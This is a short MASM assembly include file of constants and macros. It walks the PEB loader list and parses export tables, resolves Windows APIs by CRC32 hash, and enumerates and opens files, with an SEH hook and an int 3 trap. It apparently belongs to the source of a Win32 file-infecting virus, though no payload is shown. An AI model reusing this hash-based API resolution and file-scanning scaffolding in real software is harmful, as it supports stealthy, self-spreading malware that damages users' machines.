IMAGE_DIRECTORY_ENTRY_EXPORT            equ    78h

rvansin                                 equ    44

esUnmapViewOfFile                       equ    dword ptr [ebp]
esFindNextFileA                         equ    dword ptr [ebp + 8]
esFindFirstFileA                        equ    dword ptr [ebp + 0ch]
esCreateFileA                           equ    dword ptr [ebp + 14h]
esCloseHandle                           equ    dword ptr [ebp + 18h]

PEB                                     equ    30h
Ldr                                     equ    0ch
InInitializationOrderModuleList_Flink   equ    10h
pModule                                 equ    8


stackpadstruct      struct
        pushedi     dd  ?
        pushesi     dd  ?
        pushebp     dd  ?
        pushesp     dd  ?
        pushebx     dd  ?
        pushedx     dd  ?
        pushecx     dd  ?
        pusheax     dd  ? 
stackpadstruct      ends

small   macro   r, v
        db      83h, 0c0h + r, v 
endm

labelg  macro   x
x::
endm

rvaraw  macro   rva, sect, base
        sub     rva, dword ptr [sect + 0ch]
        cmp     dword ptr [sect + 8], rva
        jnb     skip_etrig
        int     3

skip_etrig:
        add     rva, dword ptr [sect + 14h]
        add     rva, base
        ret
skip_codes:
endm

setse   macro   x, y
y:      push    dword ptr fs:[x]
        mov     dword ptr fs:[x], esp
endm

crc32d  macro   x, y, lowx
crc_l1:
        xor     lowx, byte ptr [y]
        push    8
        pop     ecx

crc_l2: 
        shr     x, 1
        jnc     crc_l3
        xor     x, 0edb88320h

crc_l3:
        loop    crc_l2
        inc     y
        cmp     byte ptr [y], cl
        jnz     crc_l1
endm

crc32v  macro
        dd      0b09315f4h, 0553b5c78h, 0b41b926ch, 0c9ebd5ceh, 075272948h, 0a89b382fh, 0391ab6afh, 0
endm

include kernel32.inc
include windows.inc
includelib kernel32.lib
assume  fs:nothing